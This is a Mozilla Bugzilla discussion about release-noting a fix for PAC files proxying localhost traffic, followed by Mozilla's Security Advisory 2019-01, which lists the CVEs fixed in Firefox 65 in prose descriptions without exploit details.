(In reply to :Gijs (he/him) from [comment #74](/show_bug.cgi?id=1503393#c74 "RESOLVED FIXED - firefox permits proxying localhost via PAC"))

> Junior, should we also take the patch from [bug 1524264](/show_bug.cgi?id=1524264 "VERIFIED FIXED - Move \"No Proxy for\" outside the radio button and change the case for design guidelines") on esr considering the confusion among enterprise users?

Sounds like a plan

Flags: needinfo?(juhsu)

|  | [:Gijs (he/him)](/user_profile?user_id=159069)  Assignee |  |
| --- | --- | --- |
| [Comment 77](/show_bug.cgi?id=1503393#c77)• 6 years ago |
|  | |

(In reply to Junior [:junior] from [comment #76](/show_bug.cgi?id=1503393#c76 "RESOLVED FIXED - firefox permits proxying localhost via PAC"))

> (In reply to :Gijs (he/him) from [comment #74](/show_bug.cgi?id=1503393#c74 "RESOLVED FIXED - firefox permits proxying localhost via PAC"))
>
> > Junior, should we also take the patch from [bug 1524264](/show_bug.cgi?id=1524264 "VERIFIED FIXED - Move \"No Proxy for\" outside the radio button and change the case for design guidelines") on esr considering the confusion among enterprise users?
>
> Sounds like a plan

Mike, how do we normally communicate these types of (security-sensitive) changes to enterprise users? While the localhost change won't matter much, this patch changes things such that "no proxy for" values also apply when "use system proxy settings" is in use. See also [bug 1524264](/show_bug.cgi?id=1524264 "VERIFIED FIXED - Move \"No Proxy for\" outside the radio button and change the case for design guidelines") (which we're hoping to also uplift so the UI is a bit more clear about that happening). This could be surprising for enterprises which use autoconfig or policy to use system proxy settings but somehow also have exceptions (or didn't bother locking the exceptions but wouldn't expect users to be able to "bypass" the system proxy in this way).

Flags: needinfo?(mozilla)

|  | [Mike Kaply [:mkaply]](/user_profile?user_id=7313) |  |
| --- | --- | --- |
| [Comment 78](/show_bug.cgi?id=1503393#c78)• 6 years ago |
|  | |

I would honestly just put it in release notes and maybe a note to the enterprise mailing list as to what changed (without saying why).

Flags: needinfo?(mozilla)

|  | [Mark Straver](/user_profile?user_id=364942) |  |
| --- | --- | --- |
| [Comment 79](/show_bug.cgi?id=1503393#c79)• 6 years ago |
|  | |

(In reply to Mike Kaply [:mkaply] from [comment #78](/show_bug.cgi?id=1503393#c78 "RESOLVED FIXED - firefox permits proxying localhost via PAC"))

> I would honestly just put it in release notes and maybe a note to the
>
> enterprise mailing list as to what changed (without saying why).

I have to agree with Mike -- enterprise IT will look at release notes first thing, and giving it exposure there will inform them of the change and what to expect. If there's a dedicated mailing list on top, exposing it there too will cover just about every serious enterprise use.

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 80](/show_bug.cgi?id=1503393#c80)• 6 years ago |
|  | |

Gijs, can you please suggest some wording for this relnote item?

Flags: needinfo?(gijskruitbosch+bugs)

|  | [:Gijs (he/him)](/user_profile?user_id=159069)  Assignee |  |
| --- | --- | --- |
| [Comment 81](/show_bug.cgi?id=1503393#c81)• 6 years ago |
|  | |

(In reply to Ryan VanderMeulen [:RyanVM] from [comment #80](/show_bug.cgi?id=1503393#c80 "RESOLVED FIXED - firefox permits proxying localhost via PAC"))

> Gijs, can you please suggest some wording for this relnote item?

> Firefox now uses the "No proxies on" list regardless of how proxies are configured.

Flags: needinfo?(gijskruitbosch+bugs)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 82](/show_bug.cgi?id=1503393#c82)• 6 years ago |
|  | |

Added to the 60.6.0esr release notes: "In the network connections settings, sites added to the "No proxy for" list will honor that setting regardless of any other specified proxy settings"

[relnote-firefox](/buglist.cgi?f1=cf_tracking_firefox_relnote&o1=isnotempty):
--- → [66+](/buglist.cgi?f1=cf_tracking_firefox_relnote&o1=equals&v1=66%2B)

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1503393#a12081129_280903)• 6 years ago |

Whiteboard: [necko-triaged][post-critsmash-triage][adv-main65+] → [necko-triaged][post-critsmash-triage][adv-main65+][adv-esr60.6+]

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1503393#a24291196_1689)• 5 years ago |

Group: core-security-release
You need to [log in](/show_bug.cgi?id=1503393&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Daniel Stenberg [:bagder]](/user_profile?user_id=16743)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from www.mozilla.org_3e1c97f2_20250125_224919.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2019-01

## Security vulnerabilities fixed in Firefox 65

Announced
January 29, 2019
Impact
critical
Products
Firefox
Fixed in

* Firefox 65

#### [#CVE-2018-18500: Use-after-free parsing HTML5 stream](#CVE-2018-18500)

Reporter
Yaniv Frank with SophosLabs
Impact
critical
##### Description

A use-after-free vulnerability can occur while parsing an HTML5 stream in concert with custom HTML elements. This results in the stream parser object being freed while still in use, leading to a potentially exploitable crash.

##### References

* [Bug 1510114](https://bugzilla.mozilla.org/show_bug.cgi?id=1510114)

#### [#CVE-2018-18504: Memory corruption and out-of-bounds read of texture client buffer](#CVE-2018-18504)

Reporter
Markus Vervier of X41 D-SEC GmbH
Impact
high
##### Description

A crash and out-of-bounds read can occur when the buffer of a texture client is freed while it is still in use during graphic operations. This results in a potentially exploitable crash and the possibility of reading from the memory of the freed buffers.

##### References

* [Bug 1496413](https://bugzilla.mozilla.org/show_bug.cgi?id=1496413)

#### [#CVE-2018-18505: Privilege escalation through IPC channel messages](#CVE-2018-18505)

Reporter
Jed Davis
Impact
high
##### Description

An earlier fix for an Inter-process Communication (IPC) vulnerability, CVE-2011-3079, added authentication to communication between IPC endpoints and server parents during IPC process creation. This authentication is insufficient for channels created after the IPC process is started, leading to the authentication not being correctly applied to later channels. This could allow for a sandbox escape through IPC channels due to lack of message validation in the listener process.

##### References

* [Bug 1497749](https://bugzilla.mozilla.org/show_bug.cgi?id=1497749)
* [CVE-2011-3079](https://bugzilla.mozilla.org/show_bug.cgi?id=1087565)

#### [#CVE-2018-18503: Memory corruption with Audio Buffer](#CVE-2018-18503)

Reporter
Nils
Impact
moderate
##### Description

When JavaScript is used to create and manipulate an audio buffer, a potentially exploitable crash may occur because of a compartment mismatch in some situations.

##### References

* [Bug 1509442](https://bugzilla.mozilla.org/show_bug.cgi?id=1509442)

#### [#CVE-2018-18506: Proxy Auto-Configuration file can define localhost access to be proxied](#CVE-2018-18506)

Reporter
Jann Horn
Impact
moderate
##### Description

When proxy auto-detection is enabled, if a web server serves a Proxy Auto-Configuration (PAC) file or if a PAC file is loaded locally, this PAC file can specify that requests to the localhost are to be sent through the proxy to another server. This behavior is disallowed by default when a proxy is manually configured, but when enabled could allow for attacks on services and tools that bind to the localhost for networked behavior if they are accessed through browsing.

##### References

* [Bug 1503393](https://bugzilla.mozilla.org/show_bug.cgi?id=1503393)

#### [#CVE-2018-18502: Memory safety bugs fixed in Firefox 65](#CVE-2018-18502)

Reporter
Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Arthur Iakab, Christoph Diehl, Christian Holler, Kalel, Emilio Cobos Álvarez, Cristina Coroiu, Noemi Erli, Natalia Csoregi, Julian Seward, Gary Kwong, Tyson Smith, Yaron Tausky, and Ronald Crane reported memory safety bugs present in Firefox 64. Some of these bugs showed evidence of memory corruption and we presume that with enough effort that some of these could be exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 65](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1499426%2C1480090%2C1472990%2C1514762%2C1501482%2C1505887%2C1508102%2C1508618%2C1511580%2C1493497%2C1510145%2C1516289%2C1506798%2C1512758)

#### [#CVE-2018-18501: Memory safety bugs fixed in Firefox 65 and Firefox ESR 60.5](#CVE-2018-18501)

Reporter
Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Alex Gaynor, Christoph Diehl, Steven Crane, Jason Kratzer, Gary Kwong, and Christian Holler reported memory safety bugs present in Firefox 64 and Firefox ESR 60.4. Some of these bugs showed evidence of memory corruption and we presume that with enough effort that some of these could be exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 65 and Firefox ESR 60.5](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1512450%2C1517542%2C1513201%2C1460619%2C1502871%2C1516738%2C1516514)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.2/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)


